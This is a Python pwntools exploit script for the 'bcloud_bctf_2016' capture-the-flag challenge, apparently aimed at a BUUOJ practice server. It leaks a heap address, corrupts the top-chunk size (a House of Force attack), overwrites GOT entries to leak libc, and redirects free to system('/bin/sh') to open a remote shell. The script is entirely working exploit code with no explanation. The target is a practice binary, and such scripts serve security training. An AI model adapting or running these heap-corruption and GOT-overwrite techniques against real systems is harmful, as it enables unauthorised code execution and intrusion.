from pwn import *

#context.log_level = 'debug'

pn = './bcloud_bctf_2016'
#p = process(pn)
p = remote('node4.buuoj.cn', 29217)
elf = ELF(pn)
libc = ELF('libc-2.23.buu.so')

free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

heaparray = 0x0804B120

def debug(s):
    gdb.attach(p ,'''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/32/libc-2.23.debug.so
    ''' + s)

def alloc(size, content):
    p.sendlineafter(b'--->>\n', b'1')
    p.sendlineafter(b'content:\n', str(size).encode())
    p.sendlineafter(b'content:\n', content)

def edit(index, content):
    p.sendlineafter(b'--->>\n', b'3')
    p.sendlineafter(b'id:\n', str(index).encode())
    p.sendlineafter(b'content:\n', content)

def delete(index):
    p.sendlineafter(b'--->>\n', b'4')
    p.sendlineafter(b'id:\n', str(index).encode())

def syn():
    p.sendlineafter(b'--->>\n', b'5')

if __name__ == '__main__':
    p.sendafter(b'name:\n', b'a' * 0x40)
    p.recvuntil(b'Hey ')
    p.recv(0x40)
    heap = u32(p.recv(4))
    success('heap -> {}'.format(hex(heap)))
    p.sendafter(b'Org:\n', b'a' * 0x40)
    p.sendlineafter(b'Host:\n', p32(0xffffffff))

    top_chunk = heap + 0xd0
    success('top_chunk -> {}'.format(hex(top_chunk)))

    distance = heaparray - top_chunk
    
    alloc(0x20, b'a') #0
    alloc(0x20, b'a') #1
    alloc(0x20, b'a') #2
    alloc(0x20, b'a') #3
    alloc(distance - 0xb0, b'') #4

    alloc(0x20, p32(free_got) + p32(puts_got) + p32(free_got) + p32(heaparray)) #5

    edit(0, p32(puts_plt))
    delete(1)

    libc_base = u32(p.recv(4)) - libc.sym['puts']
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    success('libc_base -> {}'.format(hex(libc_base)))

    edit(0, p32(system))
    edit(3, p32(bin_sh))

    delete(0)

    p.interactive()